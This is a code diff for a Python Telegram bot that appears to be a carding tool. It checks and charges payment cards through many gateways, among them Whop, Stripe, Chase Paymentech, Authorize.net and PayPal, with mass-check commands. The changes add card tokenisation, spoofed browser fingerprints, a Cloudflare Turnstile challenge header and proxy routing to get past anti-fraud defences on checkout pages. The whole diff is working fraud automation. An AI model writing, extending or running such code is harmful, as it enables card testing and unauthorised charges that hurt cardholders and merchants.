+                    json={"data": {"expiration_month": int(mm), "expiration_year": year}},
+                    headers={**patch_headers,
+                             "referer": f"{WHOP_BT_BASE}/web-elements/2.12.2/hosted-elements/"
+                                        "card-expiration-date-element.html?element_id"})
+                await c.patch(
+                    f"{WHOP_BT_BASE}/api/tokens/{tok}",
+                    json={"data": {"cvc": cvv}},
+                    headers={**patch_headers,
+                             "referer": f"{WHOP_BT_BASE}/web-elements/2.12.2/hosted-elements/"
+                                        "card-verification-code-element.html?element_id"})
+            except Exception as e:
+                print(f"⚠️ [WHOP-BT] patch: {e}")
+
+            print(f"✅ [WHOP-BT] token {tok}")
+            return tok
+    except Exception as e:
+        print(f"⚠️ [WHOP-BT] failed: {e}")
+        return None
+
 
 async def whop_tokenise_card(card: Dict, proxy: str = None) -> Optional[str]:
     headers = {
@@ -76591,14 +79973,21 @@ async def whop_create_confirmation_token(session_id: str, card_token: str,
                                           proxy: str = None) -> Optional[str]:
     headers = {
         "accept":              "*/*",
-        "api-version-date":    "2026-09-06",
+        "api-version-date":    WHOP_API_VERSION,
+        "authorization":       "Bearer public",
         "content-type":        "application/json",
         "origin":              "https://whop.com",
         "referer":             f"https://whop.com/checkout/{session_id}/",
         "user-agent":          WHOP_UA,
         "whop-private-schema": "true",
+        "x-fern-language":     "JavaScript",
+        "x-fern-runtime":      "browser",
+        "x-ssk":               WHOP_SSK or whop_ssk_from_cookie(cookie),
         "cookie":              cookie,
     }
+    # Cloudflare Turnstile proof for this endpoint, when one is available.
+    if WHOP_CHALLENGE:
+        headers["whop-challenge-passive"] = WHOP_CHALLENGE
     payload = {
         "account_id": account_id,
         "billing_details": {
@@ -76616,6 +80005,15 @@ async def whop_create_confirmation_token(session_id: str, card_token: str,
             "type":     "card",
             "category": "card",
             "card":     {"token": card_token},
+        },
+        "browser_info": {
+            "platform":             "Win32",
+            "color_depth":          24,
+            "screen_height":        1080,
+            "screen_width":         1920,
+            "javascript_enabled":   True,
+            "language":             "en-US",
+            "timezone":             "Asia/Calcutta",
         },
         "return_url":         WHOP_RETURN_URL,
         "setup_future_usage": "off_session",
@@ -76646,7 +80044,7 @@ async def whop_confirm_legacy(session_id: str, conf_token: str,
                                 account_id: str = None) -> Dict:
     headers = {
         "accept":              "*/*",
-        "api-version-date":    "2026-09-06",
+        "api-version-date":    WHOP_API_VERSION,
         "content-type":        "application/json",
         "origin":              "https://whop.com",
         "referer":             f"https://whop.com/checkout/{session_id}/",
@@ -76700,54 +80098,43 @@ async def whop_confirm_new(session_id: str, conf_token: str,
                             proxy: str = None,
                             card_token: str = None,
                             account_id: str = None) -> Dict:
-    origin = f"https://{urlparse(checkout_url).netloc}"
+    """POST /checkout_sessions/{id}/confirm — exact shape from the live site.
+
+    Captured body is only:
+        attestations, browser_behavior_v1, client_secret, confirmation_token
+    (payment_method / account_id / expected_quoted_at are NOT sent).
+    """
     headers = {
         "accept":              "*/*",
-        "api-version-date":    "2026-09-06",
+        "api-version-date":    WHOP_API_VERSION,
         "content-type":        "application/json",
-        "origin":              origin,
+        "origin":              "https://whop.com",
         "referer":             checkout_url,
         "user-agent":          WHOP_UA,
         "whop-private-schema": "true",
+        "x-fern-language":     "JavaScript",
+        "x-fern-runtime":      "browser",
+        "x-ssk":               WHOP_SSK or whop_ssk_from_cookie(cookie),
+        "cookie":              cookie,
     }
     payload = {
-        "confirmation_token": conf_token,
-        "client_secret":      client_secret,
-        "attestations":       {"tos_accepted": True},
-        "expected_quoted_at": quoted_at,
+        "attestations":        {"tos_accepted": True},
+        "browser_behavior_v1": whop_browser_behavior(),
+        "client_secret":       client_secret,
+        "confirmation_token":  conf_token,
     }
-    extra = {}
-    if card_token:
-        extra["payment_method"] = {
-            "type":     "card",
-            "category": "card",
-            "card":     {"token": card_token},
-        }
-    if account_id:
-        extra["account_id"] = account_id
 
+    url = f"{WHOP_API_LEGACY}/checkout_sessions/{session_id}/confirm"
     async with whop_client(proxy, timeout=60.0) as c:
-        r = await c.post(
-            f"{WHOP_API_NEW}/checkout_sessions/{session_id}/confirm",
-            headers=headers, json={**payload, **extra} if extra else payload)
-        print(f"📤 [WHOP] confirm(new) HTTP {r.status_code}"
-              f"{' (payment_method mounted)' if extra else ''}")
-        if extra and r.status_code >= 400:
-            print(f"⚠️ [WHOP] confirm with payment_method rejected "
-                  f"({r.status_code}); retrying without it")
-            r = await c.post(
-                f"{WHOP_API_NEW}/checkout_sessions/{session_id}/confirm",
-                headers=headers, json=payload)
-            print(f"📤 [WHOP] confirm(new, fallback) HTTP {r.status_code}")
+        r = await c.post(url, headers=headers, json=payload)
+        print(f"📤 [WHOP] confirm HTTP {r.status_code}")
+        if r.status_code >= 400:
+            print(f"⚠️ [WHOP] confirm error body: {r.text[:300]}")
     try:
         return r.json()
     except Exception:
-        return {"error": r.text[:200], "http": r.status_code}
+        return {"error": r.text[:300], "http": r.status_code}
 
-
-# ═══════════════════════════════════════════════════════════════════════════
-#  POLLING + CLASSIFIER
-# ═══════════════════════════════════════════════════════════════════════════
 
 def _whop_reason(data: Dict) -> Tuple[str, str]:
     """Best-effort (code, message) explaining why a Whop session failed.
@@ -76925,7 +80312,7 @@ async def whop_fetch_payment(payment_id: str, session_id: str,
 
     headers = {
         "accept":              "*/*",
-        "api-version-date":    "2026-09-06",
+        "api-version-date":    WHOP_API_VERSION,
         "whop-private-schema": "true",
         "user-agent":          WHOP_UA,
         "cookie":              cookie,
@@ -76994,7 +80381,7 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
     """
     headers = {
         "accept":              "*/*",
-        "api-version-date":    "2026-09-06",
+        "api-version-date":    WHOP_API_VERSION,
         "whop-private-schema": "true",
         "user-agent":          WHOP_UA,
         "cookie":              cookie,
@@ -77281,7 +80668,11 @@ async def whop_hit(checkout_url: str, card_str: str,
     print(f"👤 <b>{billing['name']}</b>  {billing['email']}")
 
     # ── Step 2: tokenise card ──────────────────────────────────────────
-    card_token = await whop_tokenise_card(card, proxy)
+    # Prefer the new BT Elements flow; fall back to the old tokenize API.
+    card_token = await whop_bt_tokenise(card, proxy, account_id)
+    if not card_token:
+        print("↩️ [WHOP] BT tokenise failed — falling back to legacy tokenize")
+        card_token = await whop_tokenise_card(card, proxy)
     if not card_token:
         out["status"]  = "ERROR"
         out["message"] = "<b>Card tokenisation failed</b>"
@@ -80373,6 +83764,20 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         return True
 
     # ══════════════════════════════════════════════════════════════════════
+    # ── SPECIAL: /ch in reply — Chase Paymentech (single card only) ───────
+    if command in ('/ch', '/chase'):
+        await ext_single_cmd(update, context)
+        return True
+
+    # /chk and /mchk are the Stripe Auth (0$) external gateway
+    if command in ('/chk', '/sa'):
+        await ext_single_cmd(update, context)
+        return True
+    if command in ('/mchk', '/msa'):
+        await ext_mass_cmd(update, context)
+        return True
+
+    # ══════════════════════════════════════════════════════════════════════
     # ── SPECIAL: /stco and /co expect a URL + card ───────────────────────
     # MUST come before the gateway_map lookup, because /stco is not in the map.
     # ══════════════════════════════════════════════════════════════════════
@@ -80629,7 +84034,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
 
         # EzyCourse
         '/mch':  'ezycourse',
-        '/ch':   'ezycourse',
+        # /ch is Chase Paymentech now — handled before this map.
 
 
 
@@ -80714,9 +84119,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/mbtq':  'boutique',
         '/btq':   'boutique',
 
-        # Stripe Check (chk)
-        '/mchk':  'stripe_chk',
-        '/chk':   'stripe_chk',
+        # Stripe Check (chk) -> Stripe Auth external gateway (handled above)
         
         '/mpp':       'paypal_key',
         '/pp':        'paypal_key', 
@@ -85315,7 +88718,7 @@ async def reply_with_command_router(update: Update, context: ContextTypes.DEFAUL
         '/aumc', '/aumcheck', '/auc',
         '/ppmc', '/ppmcheck', '/pp',
         '/mb3', '/b3mass',
-        '/mchk', '/mcheck', '/chk',
+        '/mcheck',
         '/nstripem', '/nstripmass', '/nstripefile', '/nstripe',
         '/rzmc', '/rzmcheck', '/rz',
         '/stmc', '/stmcheck', '/stc',
@@ -89744,8 +93147,8 @@ def main():
     
 
     # ============ STRIPE CHK COMMANDS ============
-    app.add_handler(CommandHandler("chk", single_check_stripe_chk, block=False))
-    app.add_handler(CommandHandler("mchk", mass_check_stripe_chk_command, block=False))
+    app.add_handler(CommandHandler("chk", ext_single_cmd, block=False))
+    app.add_handler(CommandHandler("mchk", ext_mass_cmd, block=False))
     
 
     
@@ -89882,6 +93285,23 @@ def main():
     # ============ COUSTOM CHARGED GATE ============
     app.add_handler(CommandHandler("sy",  sy_single, block=False))
     app.add_handler(CommandHandler("msy", cc_mass,   block=False))
+
+    # external gateways (wiz batch 1)
+
+    app.add_handler(CommandHandler("pway",  ext_single_cmd, block=False))
+
+    app.add_handler(CommandHandler("mpway", ext_mass_cmd,   block=False))
+
+    app.add_handler(CommandHandler("anet",  ext_single_cmd, block=False))
+
+    app.add_handler(CommandHandler("manet", ext_mass_cmd,   block=False))
+
+    app.add_handler(CommandHandler("ch",     ext_single_cmd, block=False))
+    app.add_handler(CommandHandler("sa",     ext_single_cmd, block=False))
+    app.add_handler(CommandHandler("msa",    ext_mass_cmd,   block=False))
+    # magicpin: manual OTP login + voucher purchase
+    app.add_handler(CommandHandler("mpin", mpin_command, block=False))
+    app.add_handler(CommandHandler("mpc",  mpc_command,  block=False))
     
     app.add_handler(CommandHandler("sk",  single_check_stripe_sk))
     app.add_handler(CommandHandler("msk", mass_check_stripe_sk_command))
